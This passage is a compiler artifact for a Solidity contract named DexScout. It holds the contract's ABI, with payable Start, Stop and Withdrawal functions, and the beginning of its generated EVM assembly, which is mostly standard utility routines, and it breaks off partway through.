{
	"dexscout.sol": {
		"DexScout": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "Network",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "routerAddress",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "Start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Stop",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"dexscout.sol\":682:14545  contract DexScout {... */\n  mstore(0x40, 0x80)\n    /* \"dexscout.sol\":823:1225  constructor(string memory Network, string memory routerAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"dexscout.sol\":1171:1178  Network */\n  dup2\n    /* \"dexscout.sol\":1160:1168  _Network */\n  0x01\n    /* \"dexscout.sol\":1160:1178  _Network = Network */\n  swap1\n  dup2\n  tag_6\n  swap2\n  swap1\n  tag_7\n  jump\t// in\ntag_6:\n  pop\n    /* \"dexscout.sol\":1205:1218  routerAddress */\n  dup1\n    /* \"dexscout.sol\":1188:1202  _RouterAddress */\n  0x00\n    /* \"dexscout.sol\":1188:1218  _RouterAddress = routerAddress */\n  swap1\n  dup2\n  tag_8\n  swap2\n  swap1\n  tag_7\n  jump\t// in\ntag_8:\n  pop\n    /* \"dexscout.sol\":823:1225  constructor(string memory Network, string memory routerAddress) {... */\n  pop\n  pop\n    /* \"dexscout.sol\":682:14545  contract DexScout {... */\n  jump(tag_9)\n    /* \"#utility.yul\":7:82   */\ntag_10:\n    /* \"#utility.yul\":40:46   */\n  0x00\n    /* \"#utility.yul\":73:75   */\n  0x40\n    /* \"#utility.yul\":67:76   */\n  mload\n    /* \"#utility.yul\":57:76   */\n  swap1\n  pop\n    /* \"#utility.yul\":7:82   */\n  swap1\n  jump\t// out\n    /* \"#utility.yul\":88:205   */\ntag_11:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":211:328   */\ntag_12:\n    /* \"#utility.yul\":320:321   */\n  0x00\n    /* \"#utility.yul\":317:318   */\n  dup1\n    /* \"#utility.yul\":310:322   */\n  revert\n    /* \"#utility.yul\":334:451   */\ntag_13:\n    /* \"#utility.yul\":443:444   */\n  0x00\n    /* \"#utility.yul\":440:441   */\n  dup1\n    /* \"#utility.yul\":433:445   */\n  revert\n    /* \"#utility.yul\":457:574   */\ntag_14:\n    /* \"#utility.yul\":566:567   */\n  0x00\n    /* \"#utility.yul\":563:564   */\n  dup1\n    /* \"#utility.yul\":556:568   */\n  revert\n    /* \"#utility.yul\":580:682   */\ntag_15:\n    /* \"#utility.yul\":621:627   */\n  0x00\n    /* \"#utility.yul\":672:674   */\n  0x1f\n    /* \"#utility.yul\":668:675   */\n  not\n    /* \"#utility.yul\":663:665   */\n  0x1f\n    /* \"#utility.yul\":656:661   */\n  dup4\n    /* \"#utility.yul\":652:666   */\n  add\n    /* \"#utility.yul\":648:676   */\n  and\n    /* \"#utility.yul\":638:676   */\n  swap1\n  pop\n    /* \"#utility.yul\":580:682   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":688:868   */\ntag_16:\n    /* \"#utility.yul\":736:813   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":733:734   */\n  0x00\n    /* \"#utility.yul\":726:814   */\n  mstore\n    /* \"#utility.yul\":833:837   */\n  0x41\n    /* \"#utility.yul\":830:831   */\n  0x04\n    /* \"#utility.yul\":823:838   */\n  mstore\n    /* \"#utility.yul\":857:861   */\n  0x24\n    /* \"#utility.yul\":854:855   */\n  0x00\n    /* \"#utility.yul\":847:862   */\n  revert\n    /* \"#utility.yul\":874:1155   */\ntag_17:\n    /* \"#utility.yul\":957:984   */\n  tag_51\n    /* \"#utility.yul\":979:983   */\n  dup3\n    /* \"#utility.yul\":957:984   */\n  tag_15\n  jump\t// in\ntag_51:\n    /* \"#utility.yul\":949:955   */\n  dup2\n    /* \"#utility.yul\":945:985   */\n  add\n    /* \"#utility.yul\":1087:1093   */\n  dup2\n    /* \"#utility.yul\":1075:1085   */\n  dup2\n    /* \"#utility.yul\":1072:1094   */\n  lt\n    /* \"#utility.yul\":1051:1069   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":1039:1049   */\n  dup3\n    /* \"#utility.yul\":1036:1070   */\n  gt\n    /* \"#utility.yul\":1033:1095   */\n  or\n    /* \"#utility.yul\":1030:1118   */\n  iszero\n  tag_52\n  jumpi\n    /* \"#utility.yul\":1098:1116   */\n  tag_53\n  tag_16\n  jump\t// in\ntag_53:\n    /* \"#utility.yul\":1030:1118   */\ntag_52:\n    /* \"#utility.yul\":1138:1148   */\n  dup1\n    /* \"#utility.yul\":1134:1136   */\n  0x40\n    /* \"#utility.yul\":1127:1149   */\n  mstore\n    /* \"#utility.yul\":917:1155   */\n  pop\n    /* \"#utility.yul\":874:1155   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1161:1290   */\ntag_18:\n    /* \"#utility.yul\":1195:1201   */\n  0x00\n    /* \"#utility.yul\":1222:1242   */\n  tag_55\n  tag_10\n  jump\t// in\ntag_55:\n    /* \"#utility.yul\":1212:1242   */\n  swap1\n  pop\n    /* \"#utility.yul\":1251:1284   */\n  tag_56\n    /* \"#utility.yul\":1279:1283   */\n  dup3\n    /* \"#utility.yul\":1271:1277   */\n  dup3\n    /* \"#utility.yul\":1251:1284   */\n  tag_17\n  jump\t// in\ntag_56:\n    /* \"#utility.yul\":1161:1290   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1296:1604   */\ntag_19:\n    /* \"#utility.yul\":1358:1362   */\n  0x00\n    /* \"#utility.yul\":1448:1466   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":1440:1446   */\n  dup3\n    /* \"#utility.yul\":1437:1467   */\n  gt\n    /* \"#utility.yul\":1434:1490   */\n  iszero\n  tag_58\n  jumpi\n    /* \"#utility.yul\":1470:1488   */\n  tag_59\n  tag_16\n  jump\t// in\ntag_59:\n    /* \"#utility.yul\":1434:1490   */\ntag_58:\n    /* \"#utility.yul\":1508:1537   */\n  tag_60\n    /* \"#utility.yul\":1530:1536   */\n  dup3\n    /* \"#utility.yul\":1508:1537   */\n  tag_15\n  jump\t// in\ntag_60:\n    /* \"#utility.yul\":1500:1537   */\n  swap1\n  pop\n    /* \"#utility.yul\":1592:1596   */\n  0x20\n    /* \"#utility.yul\":1586:1590   */\n  dup2\n    /* \"#utility.yul\":1582:1597   */\n  add\n    /* \"#utility.yul\":1574:1597   */\n  swap1\n  pop\n    /* \"#utility.yul\":1296:1604   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1610:1856   */\ntag_20:\n    /* \"#utility.yul\":1691:1692   */\n  0x00\n    /* \"#utility.yul\":1701:1814   */\ntag_62:\n    /* \"#utility.yul\":1715:1721   */\n  dup4\n    /* \"#utility.yul\":1712:1713   */\n  dup2\n    /* \"#utility.yul\":1709:1722   */\n  lt\n    /* \"#utility.yul\":1701:1814   */\n  iszero\n  tag_64\n  jumpi\n    /* \"#utility.yul\":1800:1801   */\n  dup1\n    /* \"#utility.yul\":1795:1798   */\n  dup3\n    /* \"#utility.yul\":1791:1802   */\n  add\n    /* \"#utility.yul\":1785:1803   */\n  mload\n    /* \"#utility.yul\":1781:1782   */\n  dup2\n    /* \"#utility.yul\":1776:1779   */\n  dup5\n    /* \"#utility.yul\":1772:1783   */\n  add\n    /* \"#utility.yul\":1765:1804   */\n  mstore\n    /* \"#utility.yul\":1737:1739   */\n  0x20\n    /* \"#utility.yul\":1734:1735   */\n  dup2\n    /* \"#utility.yul\":1730:1740   */\n  add\n    /* \"#utility.yul\":1725:1740   */\n  swap1\n  pop\n    /* \"#utility.yul\":1701:1814   */\n  jump(tag_62)\ntag_64:\n    /* \"#utility.yul\":1848:1849   */\n  0x00\n    /* \"#utility.yul\":1839:1845   */\n  dup5\n    /* \"#utility.yul\":1834:1837   */\n  dup5\n    /* \"#utility.yul\":1830:1846   */\n  add\n    /* \"#utility.yul\":1823:1850   */\n  mstore\n    /* \"#utility.yul\":1672:1856   */\n  pop\n    /* \"#utility.yul\":1610:1856   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1862:2296   */\ntag_21:\n    /* \"#utility.yul\":1951:1956   */\n  0x00\n    /* \"#utility.yul\":1976:2042   */\n  tag_66\n    /* \"#utility.yul\":1992:2041   */\n  tag_67\n    /* \"#utility.yul\":2034:2040   */\n  dup5\n    /* \"#utility.yul\":1992:2041   */\n  tag_19\n  jump\t// in\ntag_67:\n    /* \"#utility.yul\":1976:2042   */\n  tag_18\n  jump\t// in\ntag_66:\n    /* \"#utility.yul\":1967:2042   */\n  swap1\n  pop\n    /* \"#utility.yul\":2065:2071   */\n  dup3\n    /* \"#utility.yul\":2058:2063   */\n  dup2\n    /* \"#utility.yul\":2051:2072   */\n  mstore\n    /* \"#utility.yul\":2103:2107   */\n  0x20\n    /* \"#utility.yul\":2096:2101   */\n  dup2\n    /* \"#utility.yul\":2092:2108   */\n  add\n    /* \"#utility.yul\":2141:2144   */\n  dup5\n    /* \"#utility.yul\":2132:2138   */\n  dup5\n    /* \"#utility.yul\":2127:2130   */\n  dup5\n    /* \"#utility.yul\":2123:2139   */\n  add\n    /* \"#utility.yul\":2120:2145   */\n  gt\n    /* \"#utility.yul\":2117:2229   */\n  iszero\n  tag_68\n  jumpi\n    /* \"#utility.yul\":2148:2227   */\n  tag_69\n  tag_14\n  jump\t// in\ntag_69:\n    /* \"#utility.yul\":2117:2229   */\ntag_68:\n    /* \"#utility.yul\":2238:2290   */\n  tag_70\n    /* \"#utility.yul\":2283:2289   */\n  dup5\n    /* \"#utility.yul\":2278:2281   */\n  dup3\n    /* \"#utility.yul\":2273:2276   */\n  dup6\n    /* \"#utility.yul\":2238:2290   */\n  tag_20\n  jump\t// in\ntag_70:\n    /* \"#utility.yul\":1957:2296   */\n  pop\n    /* \"#utility.yul\":1862:2296   */\n  swap4\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2316:2671   */\ntag_22:\n    /* \"#utility.yul\":2383:2388   */\n  0x00\n    /* \"#utility.yul\":2432:2435   */\n  dup3\n    /* \"#utility.yul\":2425:2429   */\n  0x1f\n    /* \"#utility.yul\":2417:2423   */\n  dup4\n    /* \"#utility.yul\":2413:2430   */\n  add\n    /* \"#utility.yul\":2409:2436   */\n  slt\n    /* \"#utility.yul\":2399:2521   */\n  tag_72\n  jumpi\n    /* \"#utility.yul\":2440:2519   */\n  tag_73\n  tag_13\n  jump\t// in\ntag_73:\n    /* \"#utility.yul\":2399:2521   */\ntag_72:\n    /* \"#utility.yul\":2550:2556   */\n  dup2\n    /* \"#utility.yul\":2544:2557   */\n  mload\n    /* \"#utility.yul\":2575:2665   */\n  tag_74\n    /* \"#utility.yul\":2661:2664   */\n  dup5\n    /* \"#utility.yul\":2653:2659   */\n  dup3\n    /* \"#utility.yul\":2646:2650   */\n  0x20\n    /* \"#utility.yul\":2638:2644   */\n  dup7\n    /* \"#utility.yul\":2634:2651   */\n  add\n    /* \"#utility.yul\":2575:2665   */\n  tag_21\n  jump\t// in\ntag_74:\n    /* \"#utility.yul\":2566:2665   */\n  swap2\n  pop\n    /* \"#utility.yul\":2389:2671   */\n  pop\n    /* \"#utility.yul\":2316:2671   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2677:3530   */\ntag_3:\n    /* \"#utility.yul\":2776:2782   */\n  0x00\n    /* \"#utility.yul\":2784:2790   */\n  dup1\n    /* \"#utility.yul\":2833:2835   */\n  0x40\n    /* \"#utility.yul\":2821:2830   */\n  dup4\n    /* \"#utility.yul\":2812:2819   */\n  dup6\n    /* \"#utility.yul\":2808:2831   */\n  sub\n    /* \"#utility.yul\":2804:2836   */\n  slt\n    /* \"#utility.yul\":2801:2920   */\n  iszero\n  tag_76\n  jumpi\n    /* \"#utility.yul\":2839:2918   */\n  tag_77\n  tag_11\n  jump\t// in\ntag_77:\n    /* \"#utility.yul\":2801:2920   */\ntag_76:\n    /* \"#utility.yul\":2980:2981   */\n  0x00\n    /* \"#utility.yul\":2969:2978   */\n  dup4\n    /* \"#utility.yul\":2965:2982   */\n  add\n    /* \"#utility.yul\":2959:2983   */\n  mload\n    /* \"#utility.yul\":3010:3028   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":3002:3008   */\n  dup2\n    /* \"#utility.yul\":2999:3029   */\n  gt\n    /* \"#utility.yul\":2996:3113   */\n  iszero\n  tag_78\n  jumpi\n    /* \"#utility.yul\":3032:3111   */\n  tag_79\n  tag_12\n  jump\t// in\ntag_79:\n    /* \"#utility.yul\":2996:3113   */\ntag_78:\n    /* \"#utility.yul\":3137:3211   */\n  tag_80\n    /* \"#utility.yul\":3203:3210   */\n  dup6\n    /* \"#utility.yul\":3194:3200   */\n  dup3\n    /* \"#utility.yul\":3183:3192   */\n  dup7\n    /* \"#utility.yul\":3179:3201   */\n  add\n    /* \"#utility.yul\":3137:3211   */\n  tag_22\n  jump\t// in\ntag_80:\n    /* \"#utility.yul\":3127:3211   */\n  swap3\n  pop\n    /* \"#utility.yul\":2930:3221   */\n  pop\n    /* \"#utility.yul\":3281:3283   */\n  0x20\n    /* \"#utility.yul\":3270:3279   */\n  dup4\n    /* \"#utility.yul\":3266:3284   */\n  add\n    /* \"#utility.yul\":3260:3285   */\n  mload\n    /* \"#utility.yul\":3312:3330   */\n  0xffffffffffffffff\n    /* \"#utility.yul\":3304:3310   */\n  dup2\n    /* \"#utility.yul\":3301:3331   */\n  gt\n    /* \"#utility.yul\":3298:3415   */\n  iszero\n  tag_81\n  jumpi\n    /* \"#utility.yul\":3334:3413   */\n  tag_82\n  tag_12\n  jump\t// in\ntag_82:\n    /* \"#utility.yul\":3298:3415   */\ntag_81:\n    /* \"#utility.yul\":3439:3513   */\n  tag_83\n    /* \"#utility.yul\":3505:3512   */\n  dup6\n    /* \"#utility.yul\":3496:3502   */\n  dup3\n    /* \"#utility.yul\":3485:3494   */\n  dup7\n    /* \"#utility.yul\":3481:3503   */\n  add\n    /* \"#utility.yul\":3439:3513   */\n  tag_22\n  jump\t// in\ntag_83:\n    /* \"#utility.yul\":3429:3513   */\n  swap2\n  pop\n    /* \"#utility.yul\":3231:3523   */\n  pop\n    /* \"#utility.yul\":2677:3530   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3536:3635   */\ntag_23:\n    /* \"#utility.yul\":3588:3594   */\n  0x00\n    /* \"#utility.yul\":3622:3627   */\n  dup2\n    /* \"#utility.yul\":3616:3628   */\n  mload\n    /* \"#utility.yul\":3606:3628   */\n  swap1\n  pop\n    /* \"#utility.yul\":3536:3635   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3641:3821   */\ntag_24:\n    /* \"#utility.yul\":3689:3766   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":3686:3687   */\n  0x00\n    /* \"#utility.yul\":3679:3767   */\n  mstore\n    /* \"#utility.yul\":3786:3790   */\n  0x22\n    /* \"#utility.yul\":3783:3784   */\n  0x04\n    /* \"#utility.yul\":3776:3791   */\n  mstore\n    /* \"#utility.yul\":3810:3814   */\n  0x24\n    /* \"#utility.yul\":3807:3808   */\n  0x00\n    /* \"#utility.yul\":3800:3815   */\n  revert\n    /* \"#utility.yul\":3827:4147   */\ntag_25:\n    /* \"#utility.yul\":3871:3877   */\n  0x00\n    /* \"#utility.yul\":3908:3909   */\n  0x02\n    /* \"#utility.yul\":3902:3906   */\n  dup3\n    /* \"#utility.yul\":3898:3910   */\n  div\n    /* \"#utility.yul\":3888:3910   */\n  swap1\n  pop\n    /* \"#utility.yul\":3955:3956   */\n  0x01\n    /* \"#utility.yul\":3949:3953   */\n  dup3\n    /* \"#utility.yul\":3945:3957   */\n  and\n    /* \"#utility.yul\":3976:3994   */\n  dup1\n    /* \"#utility.yul\":3966:4047   */\n  tag_87\n  jumpi\n    /* \"#utility.yul\":4032:4036   */\n  0x7f\n    /* \"#utility.yul\":4024:4030   */\n  dup3\n    /* \"#utility.yul\":4020:4037   */\n  and\n    /* \"#utility.yul\":4010:4037   */\n  swap2\n  pop\n    /* \"#utility.yul\":3966:4047   */\ntag_87:\n    /* \"#utility.yul\":4094:4096   */\n  0x20\n    /* \"#utility.yul\":4086:4092   */\n  dup3\n    /* \"#utility.yul\":4083:4097   */\n  lt\n    /* \"#utility.yul\":4063:4081   */\n  dup2\n    /* \"#utility.yul\":4060:4098   */\n  sub\n    /* \"#utility.yul\":4057:4141   */\n  tag_88\n  jumpi\n    /* \"#utility.yul\":4113:4131   */\n  tag_89\n  tag_24\n  jump\t// in\ntag_89:\n    /* \"#utility.yul\":4057:4141   */\ntag_88:\n    /* \"#utility.yul\":3878:4147   */\n  pop\n    /* \"#utility.yul\":3827:4147   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4153:4294   */\ntag_26:\n    /* \"#utility.yul\":4202:4206   */\n  0x00\n    /* \"#utility.yul\":4225:4228   */\n  dup2\n    /* \"#utility.yul\":4217:4228   */\n  swap1\n  pop\n    /* \"#utility.yul\":4248:4251   */\n  dup2\n    /* \"#utility.yul\":4245:4246   */\n  0x00\n    /* \"#utility.yul\":4238:4252   */\n  mstore\n    /* \"#utility.yul\":4282:4286   */\n  0x20\n    /* \"#utility.yul\":4279:4280   */\n  0x00\n    /* \"#utility.yul\":4269:4287   */\n  keccak256\n    /* \"#utility.yul\":4261:4287   */\n  swap1\n  pop\n    /* \"#utility.yul\":4153:4294   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4300:4393   */\ntag_27:\n    /* \"#utility.yul\":4337:4343   */\n  0x00\n    /* \"#utility.yul\":4384:4386   */\n  0x20\n    /* \"#utility.yul\":4379:4381   */\n  0x1f\n    /* \"#utility.yul\":4372:4377   */\n  dup4\n    /* \"#utility.yul\":4368:4382   */\n  add\n    /* \"#utility.yul\":4364:4387   */\n  div\n    /* \"#utility.yul\":4354:4387   */\n  swap1\n  pop\n    /* \"#utility.yul\":4300:4393   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4399:4506   */\ntag_28:\n    /* \"#utility.yul\":4443:4451   */\n  0x00\n    /* \"#utility.yul\":4493:4498   */\n  dup3\n    /* \"#utility.yul\":4487:4491   */\n  dup3\n    /* \"#utility.yul\":4483:4499   */\n  shl\n    /* \"#utility.yul\":4462:4499   */\n  swap1\n  pop\n    /* \"#utility.yul\":4399:4506   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4512:4905   */\ntag_29:\n    /* \"#utility.yul\":4581:4587   */\n  0x00\n    /* \"#utility.yul\":4631:4632   */\n  0x08\n    /* \"#utility.yul\":4619:4629   */\n  dup4\n    /* \"#utility.yul\":4615:4633   */\n  mul\n    /* \"#utility.yul\":4654:4751   */\n  tag_94\n    /* \"#utility.yul\":4684:4750   */\n  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":4673:4682   */\n  dup3\n    /* \"#utility.yul\":4654:4751   */\n  tag_28\n  jump\t// in\ntag_94:\n    /* \"#utility.yul\":4772:4811   */\n  tag_95\n    /* \"#utility.yul\":4802:4810   */\n  dup7\n    /* \"#utility.yul\":4791:4800   */\n  dup4\n    /* \"#utility.yul\":4772:4811   */\n  tag_28\n  jump\t// in\ntag_95:\n    /* \"#utility.yul\":4760:4811   */\n  swap6\n  pop\n    /* \"#utility.yul\":4844:4848   */\n  dup1\n    /* \"#utility.yul\":4840:4849   */\n  not\n    /* \"#utility.yul\":4833:4838   */\n  dup5\n    /* \"#utility.yul\":4829:4850   */\n  and\n    /* \"#utility.yul\":4820:4850   */\n  swap4\n  pop\n    /* \"#utility.yul\":4893:4897   */\n  dup1\n    /* \"#utility.yul\":4883:4891   */\n  dup7\n    /* \"#utility.yul\":4879:4898   */\n  and\n    /* \"#utility.yul\":4872:4877   */\n  dup5\n    /* \"#utility.yul\":4869:4899   */\n  or\n    /* \"#utility.yul\":4859:4899   */\n  swap3\n  pop\n    /* \"#utility.yul\":4588:4905   */\n  pop\n  pop\n    /* \"#utility.yul\":4512:4905   */\n  swap4\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4911:4988   */\ntag_30:\n    /* \"#utility.yul\":4948:4955   */\n  0x00\n    /* \"#utility.yul\":4977:4982   */\n  dup2\n    /* \"#utility.yul\":4966:4982   */\n  swap1\n  pop\n    /* \"#utility.yul\":4911:4988   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":4994:5054   */\ntag_31:\n    /* \"#utility.yul\":5022:5025   */\n  0x00\n    /* \"#utility.yul\":5043:5048   */\n  dup2\n    /* \"#utility.yul\":5036:5048   */\n  swap1\n  pop\n    /* \"#utility.yul\":4994:5054   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5060:5202   */\ntag_32:\n    /* \"#utility.yul\":5110:5119   */\n  0x00\n    /* \"#utility.yul\":5143:5196   */\n  tag_99\n    /* \"#utility.yul\":5161:5195   */\n  tag_100\n    /* \"#utility.yul\":5170:5194   */\n  tag_101\n    /* \"#utility.yul\":5188:5193   */\n  dup5\n    /* \"#utility.yul\":5170:5194   */\n  tag_30\n  jump\t// in\ntag_101:\n    /* \"#utility.yul\":5161:5195   */\n  tag_31\n  jump\t// in\ntag_100:\n    /* \"#utility.yul\":5143:5196   */\n  tag_30\n  jump\t// in\ntag_99:\n    /* \"#utility.yul\":5130:5196   */\n  swap1\n  pop\n    /* \"#utility.yul\":5060:5202   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5208:5283   */\ntag_33:\n    /* \"#utility.yul\":5251:5254   */\n  0x00\n    /* \"#utility.yul\":5272:5277   */\n  dup2\n    /* \"#utility.yul\":5265:5277   */\n  swap1\n  pop\n    /* \"#utility.yul\":5208:5283   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5289:5558   */\ntag_34:\n    /* \"#utility.yul\":5399:5438   */\n  tag_104\n    /* \"#utility.yul\":5430:5437   */\n  dup4\n    /* \"#utility.yul\":5399:5438   */\n  tag_32\n  jump\t// in\ntag_104:\n    /* \"#utility.yul\":5460:5551   */\n  tag_105\n    /* \"#utility.yul\":5509:5550   */\n  tag_106\n    /* \"#utility.yul\":5533:5549   */\n  dup3\n    /* \"#utility.yul\":5509:5550   */\n  tag_33\n  jump\t// in\ntag_106:\n    /* \"#utility.yul\":5501:5507   */\n  dup5\n    /* \"#utility.yul\":5494:5498   */\n  dup5\n    /* \"#utility.yul\":5488:5499   */\n  sload\n    /* \"#utility.yul\":5460:5551   */\n  tag_29\n  jump\t// in\ntag_105:\n    /* \"#utility.yul\":5454:5458   */\n  dup3\n    /* \"#utility.yul\":5447:5552   */\n  sstore\n    /* \"#utility.yul\":5365:5558   */\n  pop\n    /* \"#utility.yul\":5289:5558   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5564:5637   */\ntag_35:\n    /* \"#utility.yul\":5609:5612   */\n  0x00\n    /* \"#utility.yul\":5564:5637   */\n  swap1\n  jump\t// out\n    /* \"#utility.yul\":5643:5832   */\ntag_36:\n    /* \"#utility.yul\":5720:5752   */\n  tag_109\n  tag_35\n  jump\t// in\ntag_109:\n    /* \"#utility.yul\":5761:5826   */\n  tag_110\n    /* \"#utility.yul\":5819:5825   */\n  dup2\n    /* \"#utility.yul\":5811:5817   */\n  dup5\n    /* \"#utility.yul\":5805:5809   */\n  dup5\n    /* \"#utility.yul\":5761:5826   */\n  tag_34\n  jump\t// in\ntag_110:\n    /* \"#utility.yul\":5696:5832   */\n  pop\n    /* \"#utility.yul\":5643:5832   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":5838:6024   */\ntag_37:\n    /* \"#utility.yul\":5898:6018   */\ntag_112:\n    /* \"#utility.yul\":5915:5918   */\n  dup2\n    /* \"#utility.yul\":5908:5913   */\n  dup2\n    /* \"#utility.yul\":5905:5919   */\n  lt\n    /* \"#utility.yul\":5898:6018   */\n  iszero\n  tag_114\n  jumpi\n    /* \"#utility.yul\":5969:6008   */\n  tag_115\n    /* \"#utility.yul\":6006:6007   */\n  0x00\n    /* \"#utility.yul\":5999:6004   */\n  dup3\n    /* \"#utility.yul\":5969:6008   */\n  tag_36\n  jump\t// in\ntag_115:\n    /* \"#utility.yul\":5942:5943   */\n  0x01\n    /* \"#utility.yul\":5935:5940   */\n  dup2\n    /* \"#utility.yul\":5931:5944   */\n  add\n    /* \"#utility.yul\":5922:5944   */\n  swap1\n  pop\n    /* \"#utility.yul\":5898:6018   */\n  jump(tag_112)\ntag_114:\n    /* \"#utility.yul\":5838:6024   */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6030:6573   */\ntag_38:\n    /* \"#utility.yul\":6131:6133   */\n  0x1f\n    /* \"#utility.yul\":6126:6129   */\n  dup3\n    /* \"#utility.yul\":6123:6134   */\n  gt\n    /* \"#utility.yul\":6120:6566   */\n  iszero\n  tag_117\n  jumpi\n    /* \"#utility.yul\":6165:6203   */\n  tag_118\n    /* \"#utility.yul\":6197:6202   */\n  dup2\n    /* \"#utility.yul\":6165:6203   */\n  tag_26\n  jump\t// in\ntag_118:\n    /* \"#utility.yul\":6249:6278   */\n  tag_119\n    /* \"#utility.yul\":6267:6277   */\n  dup5\n    /* \"#utility.yul\":6249:6278   */\n  tag_27\n  jump\t// in\ntag_119:\n    /* \"#utility.yul\":6239:6247   */\n  dup2\n    /* \"#utility.yul\":6235:6279   */\n  add\n    /* \"#utility.yul\":6432:6434   */\n  0x20\n    /* \"#utility.yul\":6420:6430   */\n  dup6\n    /* \"#utility.yul\":6417:6435   */\n  lt\n    /* \"#utility.yul\":6414:6463   */\n  iszero\n  tag_120\n  jumpi\n    /* \"#utility.yul\":6453:6461   */\n  dup2\n    /* \"#utility.yul\":6438:6461   */\n  swap1\n  pop\n    /* \"#utility.yul\":6414:6463   */\ntag_120:\n    /* \"#utility.yul\":6476:6556   */\n  tag_121\n    /* \"#utility.yul\":6532:6554   */\n  tag_122\n    /* \"#utility.yul\":6550:6553   */\n  dup6\n    /* \"#utility.yul\":6532:6554   */\n  tag_27\n  jump\t// in\ntag_122:\n    /* \"#utility.yul\":6522:6530   */\n  dup4\n    /* \"#utility.yul\":6518:6555   */\n  add\n    /* \"#utility.yul\":6505:6516   */\n  dup3\n    /* \"#utility.yul\":6476:6556   */\n  tag_37\n  jump\t// in\ntag_121:\n    /* \"#utility.yul\":6135:6566   */\n  pop\n  pop\n    /* \"#utility.yul\":6120:6566   */\ntag_117:\n    /* \"#utility.yul\":6030:6573   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6579:6696   */\ntag_39:\n    /* \"#utility.yul\":6633:6641   */\n  0x00\n    /* \"#utility.yul\":6683:6688   */\n  dup3\n    /* \"#utility.yul\":6677:6681   */\n  dup3\n    /* \"#utility.yul\":6673:6689   */\n  shr\n    /* \"#utility.yul\":6652:6689   */\n  swap1\n  pop\n    /* \"#utility.yul\":6579:6696   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6702:6871   */\ntag_40:\n    /* \"#utility.yul\":6746:6752   */\n  0x00\n    /* \"#utility.yul\":6779:6830   */\n  tag_125\n    /* \"#utility.yul\":6827:6828   */\n  0x00\n    /* \"#utility.yul\":6823:6829   */\n  not\n    /* \"#utility.yul\":6815:6820   */\n  dup5\n    /* \"#utility.yul\":6812:6813   */\n  0x08\n    /* \"#utility.yul\":6808:6821   */\n  mul\n    /* \"#utility.yul\":6779:6830   */\n  tag_39\n  jump\t// in\ntag_125:\n    /* \"#utility.yul\":6775:6831   */\n  not\n    /* \"#utility.yul\":6860:6864   */\n  dup1\n    /* \"#utility.yul\":6854:6858   */\n  dup4\n    /* \"#utility.yul\":6850:6865   */\n  and\n    /* \"#utility.yul\":6840:6865   */\n  swap2\n  pop\n    /* \"#utility.yul\":6753:6871   */\n  pop\n    /* \"#utility.yul\":6702:6871   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6876:7171   */\ntag_41:\n    /* \"#utility.yul\":6952:6956   */\n  0x00\n    /* \"#utility.yul\":7098:7127   */\n  tag_127\n    /* \"#utility.yul\":7123:7126   */\n  dup4\n    /* 